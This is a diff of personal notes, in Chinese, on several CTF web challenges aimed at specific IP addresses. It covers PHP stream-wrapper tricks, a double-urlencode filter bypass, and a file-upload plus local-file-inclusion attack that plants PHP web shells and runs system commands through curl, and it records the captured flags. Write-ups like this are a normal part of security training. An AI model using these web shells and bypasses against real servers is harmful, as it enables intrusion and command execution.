@@ -1242,3 +1242,194 @@ data:text/plaintext,<?php phpinfo();?>
 curl -i -d "I'm Administrator!" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=php://input&d=s:3:'123';base64&c=data://text/plain;base64, PD9waHAgcGhwaW5mbygpOyA/Pg=="
 
 hello admin!<br>big hacker ? Please get out! (╯‵□′)╯︵┻━┻
+
+
+尝试4:
+I'm Administrator! base64 SSdtIEFkbWluaXN0cmF0b3Ih
+data://text/plain;base64,SSdtIEFkbWluaXN0cmF0b3Ih
+
+curl -i -d "<?php phpinfo() ?>" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=data://text/plain;base64,SSdtIEFkbWluaXN0cmF0b3Ih&d=s:3:'123';base64&c="
+
+
+============================
+urldecode二次编码绕过
+============================
+<?php
+if(eregi("hackerDJ",$_GET[id])) {
+echo("
+
+not allowed!
+
+");
+exit();
+}
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == "hackerDJ")
+{
+echo "
+Access granted!
+
+";
+echo "
+flag
+
+";
+}
+?>
+
+使用两次urlencode
+用 python 
+  print hex(ord('h'))
+     %68
+  print hex(ord('%')), hex(ord('6')),hex(ord('8'))
+     0x25 0x36 0x38
+
+curl http://120.24.86.145:9009/10.php?id=%25%36%38ackerDJ
+返回 flag{bugku__daimasj-1t2}
+
+
+===========================
+来自宇宙的信号
+===========================
+标准银河字母
+
+nopqrst
+
+=========================
+文件包含2
+=========================
+
+curl http://118.89.219.210:49166/
+提示
+<!-- upload.php -->
+
+http://118.89.219.210:49166/index.php?file=hello.php
+
+curl http://118.89.219.210:49166/index.php?file=upload.php
+返回
+<!-- upload.php -->
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>UPLOAD</title>
+</head>
+<form action="" enctype="multipart/form-data" method="post"
+name="upload">file:<input type="file" name="file" /><br>
+<input type="submit" value="upload" /></form>
+
+建立 php 文件 shell01.php 
+<?php @eval($_POST['cmd']);>
+改名 shell01.php.jpg
+
+curl -F "file=@shell01.php.jpg" http://118.89.219.210:49166/index.php?file=upload.php
+返回
+file upload successful!Save in:  upload/201808050712262388.jpg
+
+curl -d "cmd=system('ls')" http://118.89.219.210:49166/index.php?file=upload/201808050712262388.jpg
+不成功
+<? ?>被过滤
+
+curl -F "file=@shell01.gif" http://118.89.219.210:49166/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
+不支持 php 伪协议
+
+PHP 文件 改为 <script language=php> system("ls"); </script>
+改shell01.php 名 shell01.gif
+上传
+curl -F "file=@shell01.gif" http://118.89.219.210:49166/index.php?file=upload.php
+返回
+file upload successful!Save in:  upload/201808050836262027.gif
+返回
+about
+hello.php
+index.php
+this_is_th3_F14g_154f65sd4g35f4d6f43.txt
+upload
+upload.php
+
+curl http://118.89.219.210:49166/this_is_th3_F14g_154f65sd4g35f4d6f43.txt
+可以返回
+SKCTF{uP104D_1nclud3_426fh8_is_Fun}
+
+查看 upload.php 内容
+<script language=php> system("cat upload.php"); </script>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>UPLOAD</title>
+</head>
+<form action="" enctype="multipart/form-data" method="post"
+name="upload">file:<input type="file" name="file" /><br>
+<input type="submit" value="upload" /></form>
+请上传jpg gif png 格式的文件  文件大小不能超过100KiB<br>
+<?php
+//error_reporting(0);
+if(!empty($_FILES["file"]))
+{
+    $allowedExts = array("gif", "jpeg", "jpg", "png");
+    @$temp = explode(".", $_FILES["file"]["name"]);
+    $extension = end($temp);
+    if (((@$_FILES["file"]["type"] == "image/gif") || (@$_FILES["file"]["type"] == "image/jpeg")
+    || (@$_FILES["file"]["type"] == "image/jpg") || (@$_FILES["file"]["type"] == "image/pjpeg")
+    || (@$_FILES["file"]["type"] == "image/x-png") || (@$_FILES["file"]["type"] == "image/png"))
+    && (@$_FILES["file"]["size"] < 102400) && in_array($extension, $allowedExts))
+    {
+        $filename = date('Ymdhis').rand(1000, 9999).'.'.$extension;
+        if(move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename)){
+                $url="upload/".$filename;
+                $content = file_get_contents($url);
+        $content = preg_replace('/<\?php|\?>/i', '_', $content);
+        file_put_contents('upload/'.$filename, $content);
+        echo "file upload successful!Save in:  " . "upload/" . $filename;
+
+        }else{
+                echo "upload failed!";
+        }
+    }
+    else
+    {
+        echo "upload failed! allow only jpg,png,gif,jpep";
+    }
+}
+?>
+
+上传可执行任意系统命令的php
+<script language=php> echo $_POST['cmd']; system($_POST['cmd']);</script>
+
+curl -d "cmd=cat index.php" http://118.89.219.210:49166/index.php?file=upload/201808050857188116.gif
+
+返回
+<!-- upload.php -->
+<?php
+    if(!isset($_GET['file']))
+    {
+        header('Location: ./index.php?file=hello.php');
+        exit();
+    }
+    @$file = $_GET["file"];
+    if(isset($file))
+    {
+        if (preg_match('/php:\/\/|http|data|ftp|input|%00/i', $file) || strstr($file,"..") !== FALSE || strlen($file)>=70)
+        {
+            echo "<h1>NAIVE!!!</h1>";
+        }
+        else
+        {
+            include($file);
+        }
+    }
+?>
+
+
+
+
+====================
+====================
+-F "uploadFile=@filename.pdf;type=image/jpeg" 
+
+
+
+D:\ctf>curl -i -v -H "Content-Type: multipart/form-data; boundary=----------0x15f0e7eb752" --data-binary @postdata.txt http://120.24.86.145:8002/web9/
